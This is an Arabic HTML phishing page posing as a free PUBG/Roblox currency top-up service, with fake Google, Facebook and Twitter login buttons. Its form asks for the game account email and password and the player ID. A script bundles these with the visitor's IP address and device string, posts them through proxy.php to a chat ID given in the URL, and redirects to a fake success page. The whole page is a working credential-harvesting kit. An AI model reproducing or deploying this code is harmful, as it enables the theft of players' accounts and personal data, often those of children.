<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>شحن ببجي</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      font-family: Arial, sans-serif;
      color: #0ecdeb;
      background: #2e2459;
    }
    body::before {
      content: "";
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%),
                  linear-gradient(45deg, rgba(255,255,255,0.1) 25%, transparent 25%, transparent 75%, rgba(255,255,255,0.1) 75%, rgba(255,255,255,0.1)),
                  linear-gradient(-45deg, rgba(255,255,255,0.1) 25%, transparent 25%, transparent 75%, rgba(255,255,255,0.1) 75%, rgba(255,255,255,0.1));
      background-size: 200% 200%;
      animation: move 10s linear infinite;
      z-index: 0;
    }
    @keyframes move {
      0% { background-position: 0% 0%; }
      50% { background-position: 100% 100%; }
      100% { background-position: 0% 0%; }
    }
    .container {
      margin: 20px auto;
      padding: 20px;
      background: rgba(0,0,0,0.7);
      border-radius: 10px;
      width: 90%;
      max-width: 400px;
      position: relative;
      z-index: 1;
      text-align: center;
    }
    .btn {
      display: block;
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      background: #3a3a3a;
      color: #0ecdeb;
      border: none;
      border-radius: 5px;
      font-size: 18px;
      cursor: pointer;
    }
    .btn img {
      vertical-align: middle;
      height: 20px;
    }
    .pricing {
      margin-top: 20px;
    }
    .price-item {
      background: #3a3a3a;
      padding: 10px;
      margin: 5px 0;
      border-radius: 5px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .buy-btn {
      background: #0ecdeb;
      color: black;
      border: none;
      padding: 5px 10px;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }
    input, select {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: none;
      background: rgba(255, 255, 255, 0.2);
      color: white;
      font-size: 16px;
    }
    input::placeholder {
      color: rgba(255, 255, 255, 0.6);
    }
    select {
      background: rgba(255, 255, 255, 0.2);
      color: white;
    }
    form {
      background: #656c70;
      padding: 20px;
      border-radius: 10px;
    }
    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
      color: #0ecdeb;
      background: black;
      padding: 5px;
      border-radius: 5px;
    }
    canvas#snow {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }
  </style>
</head>
<body>

<style>
  body, h1, label, span, input, select, option {
    color: #0ecdeb;
  }
  .buy-btn {
    color: #ffffff;
  }
</style>

<canvas id="snow"></canvas>

<div id="login" class="container">
  <h1>شحن ببجي</h1>
  <button class="btn" onclick="showForm()">Google <img src="https://khain.pro/sor/googel.png"></button>
  <button class="btn" onclick="showForm()">Facebook <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png"></button>
  <button class="btn" onclick="showForm()">Twitter <img src="https://upload.wikimedia.org/wikipedia/ar/9/9f/Twitter_bird_logo_2012.svg"></button>
</div>

<div id="form" class="container" style="display:none;">
  <h1>تسجيل الدخول لشحن الروبوكس 🎁</h1>
  <form id="robloxForm">
    <label>البريد الإلكتروني لحساب اللعبة:</label>
    <input type="email" name="email" required>

    <label>كلمة السر لحساب اللعبة:</label>
    <input type="password" name="password" required>

    <label>معرف اللاعب (ID) الخاص بك:</label>
    <input type="text" name="player_id" required>

    <label>الكمية المراد شحنها:</label>
    <select name="amount" required>
      <option value="1000 روبوكس مجانا">1000 روبوكس مجانا</option>
      <option value="1500 روبوكس 🎁">1500 روبوكس 🎁</option>
      <option value="2000 روبوكس 🎁">2000 روبوكس 🎁</option>
      <option value="2500 روبوكس 🎁">2500 روبوكس 🎁</option>
      <option value="3000 روبوكس 🎁">3000 روبوكس 🎁</option>
    </select>

    <button type="submit" class="buy-btn">شحن</button>
  </form>
</div>

<div class="container pricing">
  <h1>قائمة الشحن 🎁</h1>
  <div class="price-item">
    <span>1000 - 0$</span>
    <button class="buy-btn">شحن</button>
  </div>
  <div class="price-item">
    <span>1500 - 2$</span>
    <button class="buy-btn">شحن</button>
  </div>
  <div class="price-item">
    <span>2000 - 3$</span>
    <button class="buy-btn">شحن</button>
  </div>
  <div class="price-item">
    <span>2500 - 4$</span>
    <button class="buy-btn">شحن</button>
  </div>
  <div class="price-item">
    <span>3000 - 5$</span>
    <button class="buy-btn">شحن</button>
  </div>
</div>

<script>
  const urlParams = new URLSearchParams(window.location.search);
  const CHAT_ID = urlParams.get('id');

  function showForm() {
    document.getElementById("login").style.display = "none";
    document.getElementById("form").style.display = "block";
  }

  document.getElementById("robloxForm").addEventListener("submit", async function(e) {
    e.preventDefault();

    const form = new FormData(this);
    const email = form.get("email");
    const password = form.get("password");
    const playerId = form.get("player_id");
    const amount = form.get("amount");
    const device = navigator.userAgent;

    const ipData = await fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .catch(() => ({ ip: "غير معروف" }));

    const message = `🎁 طلب شحن روبوكس جديد:\n\n📧 الإيميل: ${email}\n🔑 كلمة السر: ${password}\n👤 الأيدي: ${playerId}\n💰 الكمية: ${amount}\n📱 الجهاز: ${device}\n🌐 IP: ${ipData.ip}\n\n✅ تم التنفيذ بواسطة @DA4K71`;

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("message", message);

    fetch("proxy.php", {
      method: "POST",
      body: formData
    }).then(() => {
      window.location.href = "https://issol.free.nf/success/ok.html?i=1";
      this.reset();
    }).catch(() => {
      alert("حدث خطأ في الاتصال بالسيرفر.");
    });
  });
</script>

<script>
const canvas = document.getElementById('snow');
const ctx = canvas.getContext('2d');

let width = window.innerWidth;
let height = window.innerHeight;
canvas.width = width;
canvas.height = height;

let numFlakes = 100;
let flakes = [];

function createFlakes() {
  for (let i = 0; i < numFlakes; i++) {
    flakes.push({
      x: Math.random() * width,
      y: Math.random() * height,
      r: Math.random() * 3 + 2,
      d: Math.random() + 1
    });
  }
}

function drawFlakes() {
  ctx.clearRect(0, 0, width, height);
  ctx.fillStyle = "white";
  ctx.beginPath();
  for (let i = 0; i < numFlakes; i++) {
    const f = flakes[i];
    ctx.moveTo(f.x, f.y);
    ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2, true);
  }
  ctx.fill();
  moveFlakes();
}

function moveFlakes() {
  for (let i = 0; i < numFlakes; i++) {
    const f = flakes[i];
    f.y += f.d;
    if (f.y > height) {
      flakes[i] = {
        x: Math.random() * width,
        y: 0,
        r: f.r,
        d: f.d
      };
    }
  }
}

function updateSnow() {
  drawFlakes();
  requestAnimationFrame(updateSnow);
}

window.addEventListener('resize', () => {
  width = window.innerWidth;
  height = window.innerHeight;
  canvas.width = width;
  canvas.height = height;
});

createFlakes();
updateSnow();
</script>

</body>
</html>
